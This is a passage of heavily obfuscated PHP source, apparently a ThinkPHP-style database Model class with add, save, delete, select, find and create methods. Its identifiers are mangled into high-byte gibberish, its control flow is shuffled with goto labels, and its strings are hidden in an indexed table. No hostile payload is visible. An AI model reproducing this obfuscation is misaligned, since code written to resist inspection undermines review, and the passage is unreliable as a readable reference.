$b²¾­ÄÓ‘´; if ($A–Úè¼‘š[$Cº¾ØŠ‰äİ[39]]) { $this->fields[$Cº¾ØŠ‰äİ[238]] = !0; } } } $this->fields[$Cº¾ØŠ‰äİ[240]] = $b÷Ù¹ğ¹ğ; if (think_config($Cº¾ØŠ‰äİ[236])) { $this->fields[$Cº¾ØŠ‰äİ[237]] = think_config($Cº¾ØŠ‰äİ[236]); } goto CœéÉ‡•‚; C–’¾ŞÊ¦: } public function switchModel($e½ãÕº®ö, $A³è˜ Š‰Ù = array()) { $A¢İÅó° =& $_SERVER[¼€¼ˆ¦‚¡]; $dİ…•æ‹»¿ = ucwords(strtolower($e½ãÕº®ö)) . $A¢İÅó°[241]; if (!class_exists($dİ…•æ‹»¿)) { think_exception($dİ…•æ‹»¿ . think_lang($A¢İÅó°[242])); } $this->_extModel = new $dİ…•æ‹»¿($this->name); if (!empty($A³è˜ Š‰Ù)) { foreach ($A³è˜ Š‰Ù as $eè°£‡Ø¦) { $this->_extModel->setProperty($eè°£‡Ø¦, $this->{$eè°£‡Ø¦}); } } return $this->_extModel; } public function __set($fØ—ŠÜÃ, $b¼œÜ‡õÑ”) { $this->data[$fØ—ŠÜÃ] = $b¼œÜ‡õÑ”; } public function __get($BÕÅ¡„íÎŠ) { return isset($this->data[$BÕÅ¡„íÎŠ]) ? $this->data[$BÕÅ¡„íÎŠ] : null; } public function __isset($eöÀóŠÕ¬ß) { return isset($this->data[$eöÀóŠÕ¬ß]); } public function __unset($aÓßÉñÑ) { unset($this->data[$aÓßÉñÑ]); } public function __call($AËµĞ…›Ñø, $Eß¾ÁÎ•) { $a²ÔºøÂ•Û =& $_SERVER[¼€¼ˆ¦‚¡]; if (in_array(strtolower($AËµĞ…›Ñø), $this->methods, !0)) { $this->options[strtolower($AËµĞ…›Ñø)] = $Eß¾ÁÎ•[0]; return $this; } elseif (in_array(strtolower($AËµĞ…›Ñø), array($a²ÔºøÂ•Û[243], $a²ÔºøÂ•Û[244], $a²ÔºøÂ•Û[245], $a²ÔºøÂ•Û[246], $a²ÔºøÂ•Û[247]), !0)) { $B”ÕÌàøŠ‡ = isset($Eß¾ÁÎ•[0]) ? $Eß¾ÁÎ•[0] : $a²ÔºøÂ•Û[176]; $B”ÕÌàøŠ‡ = $this->db->parseKey($B”ÕÌàøŠ‡); return $this->getField(strtoupper($AËµĞ…›Ñø) . $a²ÔºøÂ•Û[248] . $B”ÕÌàøŠ‡ . $a²ÔºøÂ•Û[249] . $AËµĞ…›Ñø, $a²ÔºøÂ•Û[243]); } elseif (strtolower(substr($AËµĞ…›Ñø, 0, 5)) == $a²ÔºøÂ•Û[250]) { $B”ÕÌàøŠ‡ = think_parse_name(substr($AËµĞ…›Ñø, 5)); $cèÉî·™[$B”ÕÌàøŠ‡] = $Eß¾ÁÎ•[0]; return $this->where($cèÉî·™)->find(); } elseif (strtolower(substr($AËµĞ…›Ñø, 0, 10)) == $a²ÔºøÂ•Û[251]) { $DõøŠ»ï¹§ = think_parse_name(substr($AËµĞ…›Ñø, 10)); $cèÉî·™[$DõøŠ»ï¹§] = $Eß¾ÁÎ•[0]; return $this->where($cèÉî·™)->getField($Eß¾ÁÎ•[1]); } elseif (isset($this->_scope[$AËµĞ…›Ñø])) { return $this->scope($AËµĞ…›Ñø, $Eß¾ÁÎ•[0]); } elseif (method_exists($this, $AËµĞ…›Ñø)) { array_unshift($Eß¾ÁÎ•, $AËµĞ…›Ñø); return call_user_func_array(array($this, $a²ÔºøÂ•Û[252]), $Eß¾ÁÎ•); } else { return call_user_func_array(array(parent, $AËµĞ…›Ñø), $Eß¾ÁÎ•); } } protected function call() { goto d™À£¦²®á; aĞÃïÂ¼Üî: if (isset($F‰Æ‘Â‡¢[$f¢­çºó‡]) && $F‰Æ‘Â‡¢[$f¢­çºó‡] === $eª•ÀğŞ¸Î) { think_exception(__CLASS__ . $DŒ…ƒïÑ•£[4] . $eª•ÀğŞ¸Î . think_lang($DŒ…ƒïÑ•£[253])); return; } $F‰Æ‘Â‡¢[] = $eª•ÀğŞ¸Î; if (method_exists($this, $DŒ…ƒïÑ•£[254])) { $dñ²¦Ãñ® = call_user_func_array(array($this, $DŒ…ƒïÑ•£[255]), array($Eõ¶¡”Çœ—, $F‰Æ‘Â‡¢)); if (!is_null($dñ²¦Ãñ®) && $dñ²¦Ãñ® !== !1) { return $dñ²¦Ãñ®; } } goto dî°±‚ÅŒà; d™À£¦²®á: $DŒ…ƒïÑ•£ =& $_SERVER[¼€¼ˆ¦‚¡]; $F‰Æ‘Â‡¢ = func_get_args(); $eª•ÀğŞ¸Î = array_shift($F‰Æ‘Â‡¢); goto A·Ö‚°š‘è; A·Ö‚°š‘è: $Eõ¶¡”Çœ— = $eª•ÀğŞ¸Î; if (is_array($eª•ÀğŞ¸Î)) { $Eõ¶¡”Çœ— = $eª•ÀğŞ¸Î[1]; $eª•ÀğŞ¸Î = $eª•ÀğŞ¸Î[0]; } $f¢­çºó‡ = count($F‰Æ‘Â‡¢) - 1; goto aĞÃïÂ¼Üî; dî°±‚ÅŒà: $D¡ÖËßÌ©œ = call_user_func_array(array($this, $eª•ÀğŞ¸Î), $F‰Æ‘Â‡¢); if (method_exists($this, $DŒ…ƒïÑ•£[256])) { $dñ²¦Ãñ® = call_user_func_array(array($this, $DŒ…ƒïÑ•£[257]), array($Eõ¶¡”Çœ—, $F‰Æ‘Â‡¢, $D¡ÖËßÌ©œ)); if ($dñ²¦Ãñ®) { return $dñ²¦Ãñ®; } } return $D¡ÖËßÌ©œ; goto E‰ƒ£é ä; E‰ƒ£é ä: } protected function _initialize() { } protected function _facade($fÖ¦ŒŞ‰‡·) { $A¾Ì­˜óÉÕ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!empty($this->fields)) { foreach ($fÖ¦ŒŞ‰‡· as $B †É½ => $EÕåŠ«Ğ) { if (!in_array($B †É½, $this->fields, !0)) { unset($fÖ¦ŒŞ‰‡·[$B †É½]); } elseif (is_scalar($EÕåŠ«Ğ)) { $this->_parseType($fÖ¦ŒŞ‰‡·, $B †É½); } } } if (!empty($this->options[$A¾Ì­˜óÉÕ[258]])) { $fÖ¦ŒŞ‰‡· = array_map($this->options[$A¾Ì­˜óÉÕ[258]], $fÖ¦ŒŞ‰‡·); unset($this->options[$A¾Ì­˜óÉÕ[258]]); } $this->_beforeWrite($fÖ¦ŒŞ‰‡·); return $fÖ¦ŒŞ‰‡·; } protected function _beforeWrite(&$B„ğÀ ‘ó) { } public function add($bóä™’Õ¸ = '', $BÑÅ³Ğ¢š = array(), $Cğ±ÈÑ…ò­ = false) { goto b´ƒì´«Š†; AÃŠ‘–ê™: if (!1 === $this->_beforeInsert($bóä™’Õ¸, $BÑÅ³Ğ¢š)) { return !1; } $e¤§¹·¦ƒŞ = $this->db->insert($bóä™’Õ¸, $BÑÅ³Ğ¢š, $Cğ±ÈÑ…ò­); if (!1 !== $e¤§¹·¦ƒŞ) { $fî‡‡ï© = $this->getLastInsID(); if ($fî‡‡ï©) { $bóä™’Õ¸[$this->getPk()] = $fî‡‡ï©; $this->_after_insert($bóä™’Õ¸, $BÑÅ³Ğ¢š); return $fî‡‡ï©; } $this->_after_insert($bóä™’Õ¸, $BÑÅ³Ğ¢š); } goto bÁ¾’–‹Ñ; b´ƒì´«Š†: if (empty($bóä™’Õ¸)) { if (!empty($this->data)) { $bóä™’Õ¸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¼€¼ˆ¦‚¡][259]); return !1; } } $BÑÅ³Ğ¢š = $this->_parseOptions($BÑÅ³Ğ¢š); $bóä™’Õ¸ = $this->_facade($bóä™’Õ¸); goto AÃŠ‘–ê™; bÁ¾’–‹Ñ: return $e¤§¹·¦ƒŞ; goto eˆ–é¢³; eˆ–é¢³: } protected function _beforeInsert(&$BàçŞ‡¨’‘, $c÷Ú‹¸‡Ïµ) { } protected function _after_insert($Cµ°µØªÉ, $c•Œ„¾ ò) { } public function addAll($e¬ÛÒóùÃÙ, $CÑ»œ„¡Å‘ = array(), $BøƒÕ£ÁØÄ = false) { goto C ¤‰½çÎÁ; C ¤‰½çÎÁ: $a•“­õ =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($e¬ÛÒóùÃÙ)) { $this->error = think_lang($a•“­õ[259]); return !1; } $CÑ»œ„¡Å‘ = $this->_parseOptions($CÑ»œ„¡Å‘); goto dƒà­‚¯Ø”; dƒà­‚¯Ø”: foreach ($e¬ÛÒóùÃÙ as $bĞ¬ÂœšëÏ => $Fíõ½âøÔë) { $e¬ÛÒóùÃÙ[$bĞ¬ÂœšëÏ] = $this->_facade($Fíõ½âøÔë); } if (method_exists($this->db, $a•“­õ[260])) { $f¬¾–¯Çø = $this->db->insertAll($e¬ÛÒóùÃÙ, $CÑ»œ„¡Å‘, $BøƒÕ£ÁØÄ); } else { $this->startTrans(); foreach ($e¬ÛÒóùÃÙ as $bĞ¬ÂœšëÏ => $Fíõ½âøÔë) { $f¬¾–¯Çø = $this->db->insert($Fíõ½âøÔë, $CÑ»œ„¡Å‘, $BøƒÕ£ÁØÄ); } $this->commit(); } if (!1 !== $f¬¾–¯Çø) { $BÒ†½‰ÈÄ = $this->getLastInsID(); if ($BÒ†½‰ÈÄ) { return $BÒ†½‰ÈÄ; } } goto e–šÍ¡ª§á; e–šÍ¡ª§á: return $f¬¾–¯Çø; goto b¨‰ùĞİ–ì; b¨‰ùĞİ–ì: } public function selectAdd($C¾†™Šİ  = '', $EöİŒÊêò = '', $FÈ†¾›óìÕ = array()) { $EëòŠé­ˆÖ =& $_SERVER[¼€¼ˆ¦‚¡]; $FÈ†¾›óìÕ = $this->_parseOptions($FÈ†¾›óìÕ); if (!1 === ($DœªÊ­¾ªå = $this->db->selectInsert($C¾†™Šİ  ? $C¾†™Šİ  : $FÈ†¾›óìÕ[$EëòŠé­ˆÖ[261]], $EöİŒÊêò ? $EöİŒÊêò : $this->getTableName(), $FÈ†¾›óìÕ))) { $this->error = think_lang($EëòŠé­ˆÖ[262]); return !1; } else { return $DœªÊ­¾ªå; } } public function save($B‰“—ùàÃŸ = '', $Aã–´Óáóâ = array()) { goto b¯¤§áˆ®á; b†ˆĞƒ×: if (!1 !== $bËë¡´ˆ¬°) { if (isset($d¶ŒõÕÅï)) { $B‰“—ùàÃŸ[$eßò¦¾Í¯ª] = $d¶ŒõÕÅï; } $this->_afterUpdate($B‰“—ùàÃŸ, $Aã–´Óáóâ); } return $bËë¡´ˆ¬°; goto Bù“„¿°‰î; b¯¤§áˆ®á: $cÊ„ä§‰‰İ =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($B‰“—ùàÃŸ)) { if (!empty($this->data)) { $B‰“—ùàÃŸ = $this->data; $this->data = array(); } else { $this->error = think_lang($cÊ„ä§‰‰İ[259]); return !1; } } $B‰“—ùàÃŸ = $this->_facade($B‰“—ùàÃŸ); goto ašá„±‹¸í; eÊ‚„Å œÖ: if (is_array($Aã–´Óáóâ[$cÊ„ä§‰‰İ[263]]) && isset($Aã–´Óáóâ[$cÊ„ä§‰‰İ[263]][$eßò¦¾Í¯ª])) { $d¶ŒõÕÅï = $Aã–´Óáóâ[$cÊ„ä§‰‰İ[263]][$eßò¦¾Í¯ª]; } if (!1 === $this->_beforeUpdate($B‰“—ùàÃŸ, $Aã–´Óáóâ)) { return !1; } $bËë¡´ˆ¬° = $this->db->update($B‰“—ùàÃŸ, $Aã–´Óáóâ); goto b†ˆĞƒ×; ašá„±‹¸í: $Aã–´Óáóâ = $this->_parseOptions($Aã–´Óáóâ); $eßò¦¾Í¯ª = $this->getPk(); if (!isset($Aã–´Óáóâ[$cÊ„ä§‰‰İ[263]])) { if (isset($B‰“—ùàÃŸ[$eßò¦¾Í¯ª])) { $CÙ™ ‘ªÜà[$eßò¦¾Í¯ª] = $B‰“—ùàÃŸ[$eßò¦¾Í¯ª]; $Aã–´Óáóâ[$cÊ„ä§‰‰İ[263]] = $CÙ™ ‘ªÜà; unset($B‰“—ùàÃŸ[$eßò¦¾Í¯ª]); } else { $this->error = think_lang($cÊ„ä§‰‰İ[262]); return !1; } } goto eÊ‚„Å œÖ; Bù“„¿°‰î: } protected function _beforeUpdate(&$Fœ‚Ø‚›–, $b•ÂöÄ½Ì) { } protected function _afterUpdate($c«»­ÉàØƒ, $D±ÆŞ²’‚•) { } public function delete($fğÂï³³¤° = array()) { goto C´•ô†ÉŠÚ; BÀ¦•–…Ÿ˜: if (is_numeric($fğÂï³³¤°) || is_string($fğÂï³³¤°)) { if (strpos($fğÂï³³¤°, $A´Ş÷šÎŞ[47])) { $bô‰é˜¿ƒ[$dñ•ì‰¥”] = array($A´Ş÷šÎŞ[264], $fğÂï³³¤°); } else { $bô‰é˜¿ƒ[$dñ•ì‰¥”] = $fğÂï³³¤°; } $this->options[$A´Ş÷šÎŞ[263]] = $bô‰é˜¿ƒ; } $fğÂï³³¤° = $this->_parseOptions(); if (is_array($fğÂï³³¤°[$A´Ş÷šÎŞ[263]]) && isset($fğÂï³³¤°[$A´Ş÷šÎŞ[263]][$dñ•ì‰¥”])) { $eÍ³¥ĞÕôè = $fğÂï³³¤°[$A´Ş÷šÎŞ[263]][$dñ•ì‰¥”]; } goto dĞÉ½£‡Õ; C´•ô†ÉŠÚ: $A´Ş÷šÎŞ =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($fğÂï³³¤°) && empty($this->options[$A´Ş÷šÎŞ[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dñ•ì‰¥” = $this->getPk(); goto BÀ¦•–…Ÿ˜; dĞÉ½£‡Õ: $C¡°‰˜ŠŒ· = $this->db->delete($fğÂï³³¤°); if (!1 !== $C¡°‰˜ŠŒ·) { $D‘œéˆµ£Æ = array(); if (isset($eÍ³¥ĞÕôè)) { $D‘œéˆµ£Æ[$dñ•ì‰¥”] = $eÍ³¥ĞÕôè; } $this->_after_delete($D‘œéˆµ£Æ, $fğÂï³³¤°); } return $C¡°‰˜ŠŒ·; goto cµ¥­­âÅÇ; cµ¥­­âÅÇ: } protected function _after_delete($FŸÌøÍªÄ, $dÍ„»™µ·) { } public function select($b‡ÂëÊ™¢Õ = array()) { goto B½Æƒ·«Û®; DÏØ¾£¿“: $c”‚‚ƒ§Ÿ° = $this->db->select($b‡ÂëÊ™¢Õ); if (!1 === $c”‚‚ƒ§Ÿ°) { return !1; } if (empty($c”‚‚ƒ§Ÿ°)) { return null; } goto fİ¤ñíÂÑ­; fİ¤ñíÂÑ­: $this->_afterSelect($c”‚‚ƒ§Ÿ°, $b‡ÂëÊ™¢Õ); return $c”‚‚ƒ§Ÿ°; goto dŠ¡ƒİ–ğÔ; B½Æƒ·«Û®: $F Û§§ÊœÚ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_string($b‡ÂëÊ™¢Õ) || is_numeric($b‡ÂëÊ™¢Õ)) { $aˆ®Ë—–©³ = $this->getPk(); if (strpos($b‡ÂëÊ™¢Õ, $F Û§§ÊœÚ[47])) { $bë±©õŸ‹µ[$aˆ®Ë—–©³] = array($F Û§§ÊœÚ[264], $b‡ÂëÊ™¢Õ); } else { $bë±©õŸ‹µ[$aˆ®Ë—–©³] = $b‡ÂëÊ™¢Õ; } $this->options[$F Û§§ÊœÚ[263]] = $bë±©õŸ‹µ; } elseif (!1 === $b‡ÂëÊ™¢Õ) { $b‡ÂëÊ™¢Õ = $this->_parseOptions(); return $F Û§§ÊœÚ[265] . $this->db->buildSelectSql($b‡ÂëÊ™¢Õ) . $F Û§§ÊœÚ[266]; } $b‡ÂëÊ™¢Õ = $this->_parseOptions(); goto DÏØ¾£¿“; dŠ¡ƒİ–ğÔ: } protected function _afterSelect(&$D×ïõ¸‘Ÿ±, $F«­¾¿†’ƒ) { } public function buildSql($dŸŠ¬ÚÂÙ = array()) { $dÎ‘é¥Šç =& $_SERVER[¼€¼ˆ¦‚¡]; $dŸŠ¬ÚÂÙ = $this->_parseOptions($dŸŠ¬ÚÂÙ); return $dÎ‘é¥Šç[265] . $this->db->buildSelectSql($dŸŠ¬ÚÂÙ) . $dÎ‘é¥Šç[266]; } public function optionsValue($A¾§çï½ÉÎ = null) { if (is_null($A¾§çï½ÉÎ)) { return $this->options; } elseif (is_array($A¾§çï½ÉÎ)) { $this->options = array_merge($this->options, $A¾§çï½ÉÎ); } } protected function _parseOptions($e˜‘¤·°ÛÅ = array()) { goto a„ÂÓ»³ˆ; a„ÂÓ»³ˆ: $Fò¯±…Ãçí =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_array($e˜‘¤·°ÛÅ)) { $e˜‘¤·°ÛÅ = array_merge($this->options, $e˜‘¤·°ÛÅ); } $this->options = array(); goto C›¢ã¡À…Ô; A¶á²˜ªùä: if (isset($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[263]]) && is_array($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[263]]) && !empty($E­Í¡¯ù½Ï) && !isset($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[270]]) && !isset($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[267]])) { foreach ($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[263]] as $fã›½‡…ì¶ => $dÑÙè’™ù) { $fã›½‡…ì¶ = trim($fã›½‡…ì¶); if (in_array($fã›½‡…ì¶, $E­Í¡¯ù½Ï, !0)) { if (is_scalar($dÑÙè’™ù)) { $this->_parseType($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[263]], $fã›½‡…ì¶); } } elseif (!is_numeric($fã›½‡…ì¶) && $Fò¯±…Ãçí[70] != substr($fã›½‡…ì¶, 0, 1) && !1 === strpos($fã›½‡…ì¶, $Fò¯±…Ãçí[91]) && !1 === strpos($fã›½‡…ì¶, $Fò¯±…Ãçí[248]) && !1 === strpos($fã›½‡…ì¶, $Fò¯±…Ãçí[271]) && !1 === strpos($fã›½‡…ì¶, $Fò¯±…Ãçí[272])) { unset($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[263]][$fã›½‡…ì¶]); } } } $this->_options_filter($e˜‘¤·°ÛÅ); return $e˜‘¤·°ÛÅ; goto f‹–äùš­ò; C›¢ã¡À…Ô: if (!isset($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[267]])) { $e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[267]] = $this->getTableName(); $E­Í¡¯ù½Ï = $this->fields; } else { $E­Í¡¯ù½Ï = $this->getDbFields(); } if (!empty($e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[268]])) { $e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[267]] .= $Fò¯±…Ãçí[50] . $e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[268]]; } $e˜‘¤·°ÛÅ[$Fò¯±…Ãçí[269]] = $this->name; goto A¶á²˜ªùä; f‹–äùš­ò: } protected function _options_filter(&$FØÏ‹¢ßÖ) { } protected function _parseType(&$eÁ¼¬‡ˆÉö, $B““Ğ—‰Û) { $AÎ¨ªîöíö =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($this->options[$AÎ¨ªîöíö[273]][$AÎ¨ªîöíö[4] . $B““Ğ—‰Û])) { $AÄÉ¬·™† = strtolower($this->fields[$AÎ¨ªîöíö[240]][$B““Ğ—‰Û]); if (!1 !== strpos($AÄÉ¬·™†, $AÎ¨ªîöíö[274])) { } elseif (!1 === strpos($AÄÉ¬·™†, $AÎ¨ªîöíö[275]) && !1 !== strpos($AÄÉ¬·™†, $AÎ¨ªîöíö[276])) { $eÁ¼¬‡ˆÉö[$B““Ğ—‰Û] = intval($eÁ¼¬‡ˆÉö[$B““Ğ—‰Û]); } elseif (!1 !== strpos($AÄÉ¬·™†, $AÎ¨ªîöíö[277]) || !1 !== strpos($AÄÉ¬·™†, $AÎ¨ªîöíö[278])) { $eÁ¼¬‡ˆÉö[$B““Ğ—‰Û] = floatval($eÁ¼¬‡ˆÉö[$B““Ğ—‰Û]); } elseif (!1 !== strpos($AÄÉ¬·™†, $AÎ¨ªîöíö[279])) { $eÁ¼¬‡ˆÉö[$B““Ğ—‰Û] = (bool) $eÁ¼¬‡ˆÉö[$B““Ğ—‰Û]; } } } public function find($Fµ´´„™ÕË = array()) { goto aÕ”»½ÊŠ; DœŸ…²áÏ: $Fµ´´„™ÕË = $this->_parseOptions(); $e´Å‘‘« = $this->db->select($Fµ´´„™ÕË); if (!1 === $e´Å‘‘«) { return !1; } goto dÍª™›ÅØË; f‘Û½Ä»Á’: if (!empty($this->options[$AËÈ°Àğ‡[281]])) { return $this->returnResult($this->data, $this->options[$AËÈ°Àğ‡[281]]); } return $this->data; goto F‹©˜ßïª×; aÕ”»½ÊŠ: $AËÈ°Àğ‡ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_numeric($Fµ´´„™ÕË) || is_string($Fµ´´„™ÕË)) { $EÌØæ¶Õ•Ç[$this->getPk()] = intval($Fµ´´„™ÕË); $this->options[$AËÈ°Àğ‡[263]] = $EÌØæ¶Õ•Ç; } $this->options[$AËÈ°Àğ‡[280]] = 1; goto DœŸ…²áÏ; dÍª™›ÅØË: if (empty($e´Å‘‘«)) { return null; } $this->data = $e´Å‘‘«[0]; $this->_afterFind($this->data, $Fµ´´„™ÕË); goto f‘Û½Ä»Á’; F‹©˜ßïª×: } protected function _afterFind(&$bšÀ‰Ë—½, $B©ˆŸÜñÌ…) { } protected function returnResult($C¶ÌÛİ¹â, $bÇ½Î·£Æè = '') { $Eµ„–ŒÛ­Í =& $_SERVER[¼€¼ˆ¦‚¡]; if ($bÇ½Î·£Æè) { if (is_callable($bÇ½Î·£Æè)) { return call_user_func($bÇ½Î·£Æè, $C¶ÌÛİ¹â); } switch (strtolower($bÇ½Î·£Æè)) { case $Eµ„–ŒÛ­Í[282]: return json_encode($C¶ÌÛİ¹â); case $Eµ„–ŒÛ­Í[283]: return xml_encode($C¶ÌÛİ¹â); } } return $C¶ÌÛİ¹â; } public function parseFieldsMap($a…ƒÑ¦“ñİ, $DÖš­‹¹’ƒ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $A‰Şõ½ÚÜ˜ => $ašóòÙ¿â) { if ($DÖš­‹¹’ƒ == 1) { if (isset($a…ƒÑ¦“ñİ[$ašóòÙ¿â])) { $a…ƒÑ¦“ñİ[$A‰Şõ½ÚÜ˜] = $a…ƒÑ¦“ñİ[$ašóòÙ¿â]; unset($a…ƒÑ¦“ñİ[$ašóòÙ¿â]); } } else { if (isset($a…ƒÑ¦“ñİ[$A‰Şõ½ÚÜ˜])) { $a…ƒÑ¦“ñİ[$ašóòÙ¿â] = $a…ƒÑ¦“ñİ[$A‰Şõ½ÚÜ˜]; unset($a…ƒÑ¦“ñİ[$A‰Şõ½ÚÜ˜]); } } } } return $a…ƒÑ¦“ñİ; } public function setField($b¬—É––½†, $dæÖÉ•İ‘ = '') { if (is_array($b¬—É––½†)) { $E«Á†¨Ó¾ = $b¬—É––½†; } else { $E«Á†¨Ó¾[$b¬—É––½†] = $dæÖÉ•İ‘; } return $this->save($E«Á†¨Ó¾); } public function setAdd($d£‰”±ƒÖ°, $C‰—ÄˆË¿  = 1) { $cÊ¬¼–¶Ê· =& $_SERVER[¼€¼ˆ¦‚¡]; $b†º¢Œ„ = $d£‰”±ƒÖ° . $cÊ¬¼–¶Ê·[284] . $C‰—ÄˆË¿ ; if ($C‰—ÄˆË¿  < 0) { $b†º¢Œ„ = $d£‰”±ƒÖ° . $C‰—ÄˆË¿ ; } return $this->setField($d£‰”±ƒÖ°, array($cÊ¬¼–¶Ê·[285], $b†º¢Œ„)); } public function getField($B’ë˜Ş¬’, $dš‹·§Ş£ = null) { $B‰¶ãí£îÔ =& $_SERVER[¼€¼ˆ¦‚¡]; $eäº™¸Ô[$B‰¶ãí£îÔ[261]] = $B’ë˜Ş¬’; $eäº™¸Ô = $this->_parseOptions($eäº™¸Ô); $B’ë˜Ş¬’ = trim($B’ë˜Ş¬’); if (strpos($B’ë˜Ş¬’, $B‰¶ãí£îÔ[47])) { if (!isset($eäº™¸Ô[$B‰¶ãí£îÔ[280]])) { $eäº™¸Ô[$B‰¶ãí£îÔ[280]] = is_numeric($dš‹·§Ş£) ? $dš‹·§Ş£ : $B‰¶ãí£îÔ[33]; } $BàÏÄø¶Ä = $this->db->select($eäº™¸Ô); if (!empty($BàÏÄø¶Ä)) { goto B‹Üõ•£Ç½; d‰ÓøÎ’: $D¾Êß‰»èÙ = array_shift($B’ë˜Ş¬’); $A”Ìˆ®ÌÈÕ = array(); $BŒ½êéèè = count($dš¯¸İÄ™); goto d”ÑÎ˜µé; B‹Üõ•£Ç½: $dš¯¸İÄ™ = explode($B‰¶ãí£îÔ[47], $B’ë˜Ş¬’); $B’ë˜Ş¬’ = array_keys($BàÏÄø¶Ä[0]); $A¦‰ˆ³Œ¸ñ = array_shift($B’ë˜Ş¬’); goto d‰ÓøÎ’; d”ÑÎ˜µé: foreach ($BàÏÄø¶Ä as $d ³£Ğ»¼Á) { $c´êÀ‰‚Ú = $d ³£Ğ»¼Á[$A¦‰ˆ³Œ¸ñ]; if (2 == $BŒ½êéèè) { $A”Ìˆ®ÌÈÕ[$c´êÀ‰‚Ú] = $d ³£Ğ»¼Á[$D¾Êß‰»èÙ]; } else { $A”Ìˆ®ÌÈÕ[$c´êÀ‰‚Ú] = is_string($dš‹·§Ş£) ? implode($dš‹·§Ş£, $d ³£Ğ»¼Á) : $d ³£Ğ»¼Á; } } return $A”Ìˆ®ÌÈÕ; goto BêÈ½³Û¨‹; BêÈ½³Û¨‹: } } else { if (!0 !== $dš‹·§Ş£) { $eäº™¸Ô[$B‰¶ãí£îÔ[280]] = is_numeric($dš‹·§Ş£) ? $dš‹·§Ş£ : 1; } if ($dš‹·§Ş£ === $B‰¶ãí£îÔ[243]) { unset($eäº™¸Ô[$B‰¶ãí£îÔ[280]]); } $d ³£Ğ»¼Á = $this->db->select($eäº™¸Ô); if (!empty($d ³£Ğ»¼Á)) { if ($dš‹·§Ş£ === $B‰¶ãí£îÔ[243]) { return reset($d ³£Ğ»¼Á[0]); } if (!0 !== $dš‹·§Ş£ && 1 == $eäº™¸Ô[$B‰¶ãí£îÔ[280]]) { return reset($d ³£Ğ»¼Á[0]); } foreach ($d ³£Ğ»¼Á as $c¸ìªä‰) { $bÏÌØ²¿„Ï[] = $c¸ìªä‰[$B’ë˜Ş¬’]; } return $bÏÌØ²¿„Ï; } } return null; } public function create($c­¬†‹‡áÇ = '', $c‚‡°Ì¹Öì = '') { goto F½²¿ñß¹; cº¹ÛÈëÅ¼: if ($this->autoCheckFields) { $aİËÜ’Ñ… = $this->getDbFields(); foreach ($c­¬†‹‡áÇ as $E‰¥Ò‚ØË› => $cöÀ÷‹­°†) { if (!in_array($E‰¥Ò‚ØË›, $aİËÜ’Ñ…)) { unset($c­¬†‹‡áÇ[$E‰¥Ò‚ØË›]); } elseif (MAGIC_QUOTES_GPC && is_string($cöÀ÷‹­°†)) { $c­¬†‹‡áÇ[$E‰¥Ò‚ØË›] = stripslashes($cöÀ÷‹­°†); } } } $this->autoOperation($c­¬†‹‡áÇ, $c‚‡°Ì¹Öì); $this->data = $c­¬†‹‡áÇ; goto a»ÒÁùÂŞ; a»ÒÁùÂŞ: return $c­¬†‹‡áÇ; goto e‚äî³‰»; C§Àâ¿³Å: if (isset($aİËÜ’Ñ…)) { if (is_string($aİËÜ’Ñ…)) { $aİËÜ’Ñ… = explode($FçÀ‰İÕ“î[47], $aİËÜ’Ñ…); } if (think_config($FçÀ‰İÕ“î[286])) { $aİËÜ’Ñ…[] = think_config($FçÀ‰İÕ“î[287]); } foreach ($c­¬†‹‡áÇ as $E‰¥Ò‚ØË› => $cöÀ÷‹­°†) { if (!in_array($E‰¥Ò‚ØË›, $aİËÜ’Ñ…)) { unset($c­¬†‹‡áÇ[$E‰¥Ò‚ØË›]); } } } if (!$this->autoValidation($c­¬†‹‡áÇ, $c‚‡°Ì¹Öì)) { return !1; } if (!$this->autoCheckToken($c­¬†‹‡áÇ)) { $this->error = think_lang($FçÀ‰İÕ“î[288]); return !1; } goto cº¹ÛÈëÅ¼; EÏĞŠŸ“ô‘: $c­¬†‹‡áÇ = $this->parseFieldsMap($c­¬†‹‡áÇ, 0); $c‚‡°Ì¹Öì = $c‚‡°Ì¹Öì ? $c‚‡°Ì¹Öì : (!empty($c­¬†‹‡áÇ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$FçÀ‰İÕ“î[261]])) { $aİËÜ’Ñ… = $this->options[$FçÀ‰İÕ“î[261]]; unset($this->options[$FçÀ‰İÕ“î[261]]); } elseif ($c‚‡°Ì¹Öì == THINK_MODEL_INSERT && isset($this->insertFields)) { $aİËÜ’Ñ… = $this->insertFields; } elseif ($c‚‡°Ì¹Öì == THINK_MODEL_UPDATE && isset($this->updateFields)) { $aİËÜ’Ñ… = $this->updateFields; } goto C§Àâ¿³Å; F½²¿ñß¹: $FçÀ‰İÕ“î =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($c­¬†‹‡áÇ)) { $c­¬†‹‡áÇ = $_POST; } elseif (is_object($c­¬†‹‡áÇ)) { $c­¬†‹‡áÇ = get_object_vars($c­¬†‹‡áÇ); } if (empty($c­¬†‹‡áÇ) || !is_array($c­¬†‹‡áÇ)) { $this->error = think_lang($FçÀ‰İÕ“î[259]); return !1; } goto EÏĞŠŸ“ô‘; e‚äî³‰»: } public function autoCheckToken($B“Êª“áŠÁ) { $AöÀ‰ç×†ï =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($this->options[$AöÀ‰ç×†ï[289]]) && 